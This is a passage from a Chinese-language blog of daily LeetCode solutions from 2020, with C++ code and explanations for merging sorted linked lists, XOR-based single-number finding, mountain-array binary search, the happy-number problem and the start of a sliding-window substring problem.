<span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="comment">//这里就是标准的两个链表进行有序化为一个链表</span></span><br><span class="line">    <span class="function">ListNode* <span class="title">sortLists</span><span class="params">(ListNode* l1,ListNode * l2)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        ListNode * head = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        ListNode * pre = head;</span><br><span class="line">        <span class="keyword">while</span>(l1!=<span class="literal">NULL</span>&amp;&amp;l2!=<span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(l1-&gt;val &gt; l2-&gt;val)&#123;</span><br><span class="line">                pre-&gt;next=l2;</span><br><span class="line">                pre=l2;</span><br><span class="line">                l2=l2-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                pre-&gt;next=l1;</span><br><span class="line">                pre=l1;</span><br><span class="line">                l1=l1-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(l1==<span class="literal">NULL</span>)&#123;</span><br><span class="line">            pre-&gt;next=l2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            pre-&gt;next=l1;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> head-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function">ListNode* <span class="title">mergeKLists</span><span class="params">(vector&lt;ListNode*&gt;&amp; lists)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//这里如果输入为空</span></span><br><span class="line">        <span class="keyword">if</span>(lists.<span class="built_in">size</span>()==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        </span><br><span class="line">        ListNode* res=lists[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;lists.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            res = <span class="built_in">sortLists</span>(res, lists[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>很明显的做法不是吗？</p>
<p>然而有更好的做法，</p>
<h4 id="优化-1"><a href="#优化-1" class="headerlink" title="优化-1"></a>优化-1</h4><p>分治合并</p>
<p>复习下分治算法：</p>
<p>把一个难以解决的问题分解成规模较小的相似问题，分而治之。</p>
<p>子问题要求分割到<strong>最小最小</strong>！</p>
<p>那么我们分析下 可以看成  合并两个最链表 这两个链表又可以分成四个小链表，以此类推….</p>
<p>好的，那么我们大致思路为： 先把链表分割 然后从最小链表开始合并 自底向上，逐渐到最顶层。</p>
<p>代码如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="comment">//核心合并两个链表</span></span><br><span class="line">    <span class="function">ListNode* <span class="title">sortLists</span><span class="params">(ListNode* l1,ListNode * l2)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        ListNode * head = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        ListNode * pre = head;</span><br><span class="line">        <span class="keyword">while</span>(l1!=<span class="literal">NULL</span>&amp;&amp;l2!=<span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(l1-&gt;val &gt; l2-&gt;val)&#123;</span><br><span class="line">                pre-&gt;next=l2;</span><br><span class="line">                pre=l2;</span><br><span class="line">                l2=l2-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                pre-&gt;next=l1;</span><br><span class="line">                pre=l1;</span><br><span class="line">                l1=l1-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(l1==<span class="literal">NULL</span>)&#123;</span><br><span class="line">            pre-&gt;next=l2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            pre-&gt;next=l1;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> head-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">//分割的函数 在内部存在合并  分治法要求在最小子问题出</span></span><br><span class="line">    <span class="comment">//再向顶前进</span></span><br><span class="line">    <span class="function">ListNode * <span class="title">spitList</span><span class="params">(vector&lt;ListNode*&gt;&amp; lists,<span class="type">int</span> left,<span class="type">int</span> right)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(left==right)</span><br><span class="line">            <span class="keyword">return</span> lists[left];</span><br><span class="line">        <span class="keyword">if</span>(left&gt;right)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        <span class="type">int</span> mid = (left+right)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">sortLists</span>(<span class="built_in">spitList</span>(lists,left,mid),<span class="built_in">spitList</span>(lists,mid+<span class="number">1</span>,right));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">ListNode* <span class="title">mergeKLists</span><span class="params">(vector&lt;ListNode*&gt;&amp; lists)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(lists.<span class="built_in">size</span>()==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">spitList</span>(lists,<span class="number">0</span>,lists.<span class="built_in">size</span>()<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>还有一种利用优先队列的方法。这里就不说了。【还是太菜</p>
<h2 id="2020-04-28"><a href="#2020-04-28" class="headerlink" title="2020.04.28"></a>2020.04.28</h2><h4 id="I-数组中数字出现的次数"><a href="#I-数组中数字出现的次数" class="headerlink" title="I. 数组中数字出现的次数"></a><a class="link"   href="https://leetcode-cn.com/problems/shu-zu-zhong-shu-zi-chu-xian-de-ci-shu-lcof/" >I. 数组中数字出现的次数<i class="fas fa-external-link-alt"></i></a></h4><p>一个整型数组 nums 里除两个数字之外，其他数字都出现了两次。请写程序找出这两个只出现一次的数字。要求时间复杂度是O(n)，空间复杂度是O(1)。</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">示例 <span class="number">1</span>：</span><br><span class="line"></span><br><span class="line">输入：nums = [<span class="number">4</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">6</span>]</span><br><span class="line">输出：[<span class="number">1</span>,<span class="number">6</span>] 或 [<span class="number">6</span>,<span class="number">1</span>]</span><br><span class="line">示例 <span class="number">2</span>：</span><br><span class="line"></span><br><span class="line">输入：nums = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">10</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">3</span>]</span><br><span class="line">输出：[<span class="number">2</span>,<span class="number">10</span>] 或 [<span class="number">10</span>,<span class="number">2</span>]</span><br></pre></td></tr></table></figure>

<p>分析：</p>
<p>知识点： 异或 按位与运算	</p>
<p>首先我们先回忆一下 异或运算(  ^  ) 和按位与运算(  &amp;  )的规则</p>
<p>异或：相同为0  不同为1</p>
<p>按位与：有0为0  全1为1</p>
<p><a class="link"   href="https://blog.mutoo.im/2014/01/xor-and-add/" >异或和加法<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/qq_41117236/article/details/81126693" >异或和按位与<i class="fas fa-external-link-alt"></i></a></p>
<p>附上两篇关于异或和按位与的文章</p>
<p>具体说说这个</p>
<p>我们首先知道，如何解决下面这个问题</p>
<p><strong>如果除了一个数字以外，其他数字都出现了两次，那么如何找到出现一次的数字？</strong></p>
<p>可以全体异或，最终得到的值就是这个数字。仔细体会下异或就明白了。相同为0</p>
<p>而0任意异或都为其本身。</p>
<p>那么我们这里有两个不同的数字。可以分割成两个上述的问题。那么关键在于如何准确分割？</p>
<p>首先我们全体异或 得到的是最终两个不同数字的异或值。那么我们拿取这个异或值的某一个不为0的位。把这个位和这两个数字按位与，最终得到的是分割开的。</p>
<p>比如说： 最终异或： 0111     而 两个不一样的数字 1和6  其位为：0001  0110</p>
<p>那么我们利用最终异或的最后一个1来进行判断  就是0001  依次和</p>
<p>0001  0110 相互按位与  前者是1 后者是0 所以就分开啦。这样我们就可以分成两组来全异或。</p>
<p>所以代码就顺势写出来了。</p>
<p>理一遍思路</p>
<p>1、全部异或得到两个不同数字的异或值</p>
<p>2、取这个异或值的不为0的最低位</p>
<p>3、重新遍历 依次按位与分割</p>
<p>4、分割的途中对每一个异或  得到最终解</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">singleNumbers</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> ret=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> n: nums)&#123;</span><br><span class="line">            ret ^=n;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> div = <span class="number">1</span>;</span><br><span class="line">        <span class="comment">//把我们异或的最终结果 拿出不为0的位出来</span></span><br><span class="line">        <span class="keyword">while</span>((div&amp;ret)==<span class="number">0</span>)  <span class="comment">//有0为0 全1为1</span></span><br><span class="line">        &#123;</span><br><span class="line">            div&lt;&lt;=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> a = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> b = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> n:nums)&#123;</span><br><span class="line">            <span class="keyword">if</span>(div&amp;n)&#123;</span><br><span class="line">                a^=n;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                b^=n;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> vector&lt;<span class="type">int</span>&gt;&#123;a,b&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="2020-04-29"><a href="#2020-04-29" class="headerlink" title="2020.04.29"></a>2020.04.29</h2><h4 id="1095-山脉数组中查找目标值"><a href="#1095-山脉数组中查找目标值" class="headerlink" title="1095. 山脉数组中查找目标值"></a><a class="link"   href="https://leetcode-cn.com/problems/find-in-mountain-array/" >1095. 山脉数组中查找目标值<i class="fas fa-external-link-alt"></i></a></h4><p>（这是一个 交互式问题 ）</p>
<p>给你一个 山脉数组 mountainArr，请你返回能够使得 mountainArr.get(index) 等于 target 最小 的下标 index 值。</p>
<p>如果不存在这样的下标 index，就请返回 -1。</p>
<p>何为山脉数组？如果数组 A 是一个山脉数组的话，那它满足如下条件：</p>
<p>首先，A.length &gt;&#x3D; 3</p>
<p>其次，在 0 &lt; i &lt; A.length - 1 条件下，存在 i 使得：</p>
<p>A[0] &lt; A[1] &lt; … A[i-1] &lt; A[i]<br>A[i] &gt; A[i+1] &gt; … &gt; A[A.length - 1]</p>
<p>你将 不能直接访问该山脉数组，必须通过 MountainArray 接口来获取数据：</p>
<p>MountainArray.get(k) - 会返回数组中索引为k 的元素（下标从 0 开始）<br>MountainArray.length() - 会返回该数组的长度</p>
<p>注意：</p>
<p>对 MountainArray.get 发起超过 100 次调用的提交将被视为错误答案。此外，任何试图规避判题系统的解决方案都将会导致比赛资格被取消。</p>
<p>为了帮助大家更好地理解交互式问题，我们准备了一个样例 “答案”：<a class="link"   href="https://leetcode-cn.com/playground/RKhe3ave%EF%BC%8C%E8%AF%B7%E6%B3%A8%E6%84%8F%E8%BF%99" >https://leetcode-cn.com/playground/RKhe3ave，请注意这<i class="fas fa-external-link-alt"></i></a> 不是一个正确答案。</p>
<p>示例 1：</p>
<p>输入：array &#x3D; [1,2,3,4,5,3,1], target &#x3D; 3<br>输出：2<br>解释：3 在数组中出现了两次，下标分别为 2 和 5，我们返回最小的下标 2。<br>示例 2：</p>
<p>输入：array &#x3D; [0,1,2,4,2,1], target &#x3D; 3<br>输出：-1<br>解释：3 在数组中没有出现，返回 -1。</p>
<p>提示：</p>
<p>3 &lt;&#x3D; mountain_arr.length() &lt;&#x3D; 10000<br>0 &lt;&#x3D; target &lt;&#x3D; 10^9<br>0 &lt;&#x3D; mountain_arr.get(index) &lt;&#x3D; 10^9<br>通过次数10,429提交次数28,914</p>
<hr>
<p>分析：</p>
<p>很明显，这应该是我们先进行二分，在进行两个二分最终得到最终答案</p>
<p>注意到，二分算法的时间复杂度是O(log n)</p>
<p>下面是二分查找的一个详细的博文:</p>
<h5 id="二分查找"><a href="#二分查找" class="headerlink" title="二分查找"></a><a class="link"   href="https://www.cnblogs.com/kyoner/p/11080078.html" >二分查找<i class="fas fa-external-link-alt"></i></a></h5><p><em>1.</em> 分析二分查找代码时，不要出现 else，全部展开成 else if 方便理解。</p>
<p><em>2.</em> 注意「搜索区间」和 while 的终止条件，如果存在漏掉的元素，记得在最后检查。</p>
<p><em>3.</em> 如需要搜索左右边界，只要在 nums[mid] &#x3D;&#x3D; target 时做修改即可。搜索右侧时需要减一。</p>
<p>就算遇到其他的二分查找变形，运用这几点技巧，也能保证你写出正确的代码。LeetCode Explore 中有二分查找的专项练习，其中提供了三种不同的代码模板，现在你再去看看，很容易就知道这几个模板的实现原理了。</p>
<p>下面说下具体想法：</p>
<p>首先我们二分查找到整个山脉数组的最大值——利用二分查找</p>
<p>我们得到这个最大值的时候，就可以把这个山脉数组分割成两个数组</p>
<p>一个是递增数组	一个是递减数组</p>
<p>我们依次在两个数组中进行二分查找</p>
<p>emmm基础前备知识已经有了，那么代码就来了</p>
<h5 id="代码如下"><a href="#代码如下" class="headerlink" title="代码如下"></a>代码如下</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * // This is the MountainArray&#x27;s API interface.</span></span><br><span class="line"><span class="comment"> * // You should not implement it, or speculate about its implementation</span></span><br><span class="line"><span class="comment"> * class MountainArray &#123;</span></span><br><span class="line"><span class="comment"> *   public:</span></span><br><span class="line"><span class="comment"> *     int get(int index);</span></span><br><span class="line"><span class="comment"> *     int length();</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">findInMountainArray</span><span class="params">(<span class="type">int</span> target, MountainArray &amp;mountainArr)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> l = <span class="number">0</span>; <span class="type">int</span> r = mountainArr.<span class="built_in">length</span>()<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">while</span>(l&lt;r)&#123;<span class="comment">//这里确定《= 意味着是在空区间的时候出循环</span></span><br><span class="line">            <span class="comment">//我想找出最大值，最好是</span></span><br><span class="line">            <span class="type">int</span> mid = ( l+ r)/<span class="number">2</span>;</span><br><span class="line">            <span class="comment">//如果我取等 会在这里卡住</span></span><br><span class="line">            <span class="keyword">if</span>(mountainArr.<span class="built_in">get</span>(mid)&gt;mountainArr.<span class="built_in">get</span>(mid+<span class="number">1</span>))&#123;</span><br><span class="line">                r=mid;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                l = mid +<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> div = l;</span><br><span class="line">        <span class="type">int</span> xl=mountainArr.<span class="built_in">get</span>(l);</span><br><span class="line">        <span class="keyword">if</span>(xl&lt;mountainArr.<span class="built_in">get</span>(l+<span class="number">1</span>))&#123;</span><br><span class="line">            div=l+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(mountainArr.<span class="built_in">get</span>(div<span class="number">-1</span>)&gt;xl)&#123;</span><br><span class="line">            div = div <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//获得峰值</span></span><br><span class="line">        <span class="comment">//开始两个二分</span></span><br><span class="line">        <span class="type">int</span> res =  <span class="built_in">getTheValue</span>(target,mountainArr,<span class="number">0</span>,div);</span><br><span class="line">        <span class="keyword">if</span>(res != <span class="number">-1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">        res = <span class="built_in">getOtherValue</span>(target,mountainArr,div+<span class="number">1</span>,mountainArr.<span class="built_in">length</span>()<span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">if</span>(res != <span class="number">-1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">//这里是递增二分查找</span></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">getTheValue</span><span class="params">(<span class="type">int</span> target, MountainArray &amp;mountainArr,<span class="type">int</span> left, <span class="type">int</span> right)</span></span>&#123;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">while</span>(left&lt;=right)&#123;<span class="comment">//注意</span></span><br><span class="line">                <span class="type">int</span> mid = (left+right)/<span class="number">2</span>;</span><br><span class="line">                <span class="type">int</span> value = mountainArr.<span class="built_in">get</span>(mid);</span><br><span class="line">                <span class="keyword">if</span>(value==target)</span><br><span class="line">                    <span class="keyword">return</span> mid;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(value&gt;target)&#123;</span><br><span class="line">                    right = mid <span class="number">-1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(value&lt;target)&#123;</span><br><span class="line">                    left = mid +<span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//这里是递减二分查找</span></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">getOtherValue</span><span class="params">(<span class="type">int</span> target, MountainArray &amp;mountainArr,<span class="type">int</span> left, <span class="type">int</span> right)</span></span>&#123;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">while</span>(left&lt;=right)&#123;</span><br><span class="line">                <span class="type">int</span> mid = (left+right)/<span class="number">2</span>;</span><br><span class="line">                <span class="type">int</span> value = mountainArr.<span class="built_in">get</span>(mid);</span><br><span class="line">                <span class="keyword">if</span>(value==target)</span><br><span class="line">                    <span class="keyword">return</span> mid;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(value&gt;target)&#123;</span><br><span class="line">                    left = mid + <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(value&lt;target)&#123;</span><br><span class="line">                    right = mid - <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="2020-04-30"><a href="#2020-04-30" class="headerlink" title="2020.04.30"></a>2020.04.30</h2><h4 id="202-快乐数"><a href="#202-快乐数" class="headerlink" title="202. 快乐数"></a><a class="link"   href="https://leetcode-cn.com/problems/happy-number/" >202. 快乐数<i class="fas fa-external-link-alt"></i></a></h4><p>编写一个算法来判断一个数 n 是不是快乐数。</p>
<p>「快乐数」定义为：对于一个正整数，每一次将该数替换为它每个位置上的数字的平方和，然后重复这个过程直到这个数变为 1，也可能是 无限循环 但始终变不到 1。如果 可以变为  1，那么这个数就是快乐数。</p>
<p>如果 n 是快乐数就返回 True ；不是，则返回 False 。</p>
<p>示例：</p>
<p>输入：19<br>输出：true<br>解释：<br>12 + 92 &#x3D; 82<br>82 + 22 &#x3D; 68<br>62 + 82 &#x3D; 100<br>12 + 02 + 02 &#x3D; 1</p>
<hr>
<p>这道题目 亮点在于找到是否循环</p>
<p>我们知道会有以下三种可能。</p>
<ol>
<li>最终会得到 11。</li>
<li>最终会进入循环。</li>
<li>值会越来越大，最后接近无穷大。</li>
</ol>
<p>最后一种不会出现，因为 在全部拆解平方和之后，会把数字下降。</p>
<p>所以就是看循环啦。怎么判断进入循环呢？</p>
<h5 id="利用快慢指针！！"><a href="#利用快慢指针！！" class="headerlink" title="利用快慢指针！！"></a>利用快慢指针！！</h5><p>快的比慢的每次多走一步。</p>
<p>记住反正如果是1的话，最后快指针会停下来。慢指针会追上来。</p>
<p>而循环的话，快指针总会追上慢指针的，只是时间的问题而已。</p>
<p>这里的环是数值的环形链。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">//得到各个数平方和</span></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">getNext</span><span class="params">(<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line">        <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(n)&#123;</span><br><span class="line">            <span class="type">int</span> t = n%<span class="number">10</span>;</span><br><span class="line">            t*=t;</span><br><span class="line">            sum+=t;</span><br><span class="line">            n=n/<span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum; </span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isHappy</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> slow = n;</span><br><span class="line">        <span class="type">int</span> fast = n;</span><br><span class="line">        <span class="comment">//开始移动</span></span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            slow = <span class="built_in">getNext</span>(slow);</span><br><span class="line">            fast = <span class="built_in">getNext</span>(<span class="built_in">getNext</span>(fast));</span><br><span class="line">        &#125;<span class="keyword">while</span>(slow != fast);</span><br><span class="line">        <span class="keyword">return</span> slow == <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode——每日一题</category>
      </categories>
  </entry>
  <entry>
    <title>leetcode_02_part</title>
    <url>/2020/05/01/Leetcode_%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/leetcode-02-part/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>难顶，又到五月了。这几天要忙着数学建模。</p>
<p>但是leeetcode还是要接着写呀！</p>
<span id="more"></span>

<h3 id="2020-05-01"><a href="#2020-05-01" class="headerlink" title="2020.05.01"></a>2020.05.01</h3><h4 id="21-合并两个有序链表"><a href="#21-合并两个有序链表" class="headerlink" title="21. 合并两个有序链表"></a><a class="link"   href="https://leetcode-cn.com/problems/merge-two-sorted-lists/" >21. 合并两个有序链表<i class="fas fa-external-link-alt"></i></a></h4><p>将两个升序链表合并为一个新的升序链表并返回。新链表是通过拼接给定的两个链表的所有节点组成的。 </p>
<p>示例：</p>
<p>输入：1-&gt;2-&gt;4, 1-&gt;3-&gt;4<br>输出：1-&gt;1-&gt;2-&gt;3-&gt;4-&gt;4</p>
<hr>
<p>解析：</p>
<p>这道题是真的简单。初级算法做过类似的题目。</p>
<p>所以我很感谢当初自己坚持做完了初级算法。确实让我见过了大多数的题目。</p>
<p>很明显，两个链表合并。那么我们可以用双指针呀。</p>
<p>直接双指针搞定！核心的代码很简单 ，看下面代码就懂了。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">mergeTwoLists</span><span class="params">(ListNode* l1, ListNode* l2)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//注意到这里我们要判断是否为空</span></span><br><span class="line">        <span class="keyword">if</span>(l1==<span class="literal">NULL</span>||l2==<span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> l1==<span class="literal">NULL</span>?l2:l1;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//保证头节点，到时候返回头节点</span></span><br><span class="line">        <span class="comment">//利用p节点让后续迭代</span></span><br><span class="line">        ListNode *head , *p ;</span><br><span class="line">        <span class="comment">//获得头节点</span></span><br><span class="line">        <span class="keyword">if</span>(l1-&gt;val &lt; l2-&gt;val)&#123;</span><br><span class="line">            head = l1;</span><br><span class="line">            l1 = l1-&gt;next;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            head = l2;</span><br><span class="line">            l2 = l2-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        p = head;</span><br><span class="line">        <span class="comment">//直到其中一个为空指针</span></span><br><span class="line">        <span class="keyword">while</span>(l1!=<span class="literal">NULL</span> &amp;&amp; l2!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(l1-&gt;val &lt; l2-&gt;val)&#123;</span><br><span class="line">                p-&gt;next = l1;</span><br><span class="line">                l1 = l1-&gt;next;</span><br><span class="line">                p = p-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                p-&gt;next = l2;</span><br><span class="line">                l2 = l2-&gt;next;</span><br><span class="line">                p = p-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//到时候如果有不是空的就直接处理</span></span><br><span class="line">        <span class="keyword">if</span>(l1!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">            p-&gt;next=l1;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            p-&gt;next=l2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="2020-05-02"><a href="#2020-05-02" class="headerlink" title="2020.05.02"></a>2020.05.02</h3><h4 id="3-无重复字符的最长子串"><a href="#3-无重复字符的最长子串" class="headerlink" title="3. 无重复字符的最长子串"></a><a class="link"   href="https://leetcode-cn.com/problems/longest-substring-without-repeating-characters/" >3. 无重复字符的最长子串<i class="fas fa-external-link-alt"></i></a></h4><p>给定一个字符串，请你找出其中不含有重复字符的 最长子串 的长度。</p>
<p>示例 1:</p>
<p>输入: “abcabcbb”<br>输出: 3<br>解释: 因为无重复字符的最长子串是 “abc”，所以其长度为 3。<br>示例 2:</p>
<p>输入: “bbbbb”<br>输出: 1<br>解释: 因为无重复字符的最长子串是 “b”，所以其长度为 1。<br>示例 3:</p>
<p>输入: “pwwkew”<br>输出: 3<br>解释: 因为无重复字符的最长子串是 “wke”，所以其长度为 3。<br>     请注意，你的答案必须是 子串 的长度，”pwke” 是一个子序列，不是子串。</p>
<hr>
<p>这道题目 也是一道动态规划题目，更加重要的是一道滑动窗口题目。</p>
<p>看到它是子串，不是子序列！！</p>
<p>很有趣的滑动窗口题目！</p>
<p>怎么想呢？——我们需要看到的是子串</p>
<p>那么我们用类似滑动窗口的视角来滑动。这样我们需要有几个步骤</p>
<p>判断字符重复</p>
<p>先移动右边界限，如果出现重复字符 那么再移动左边。</p>
<p>每一次准备移动左边都说明 这次子串结束 计算其长度！</p>
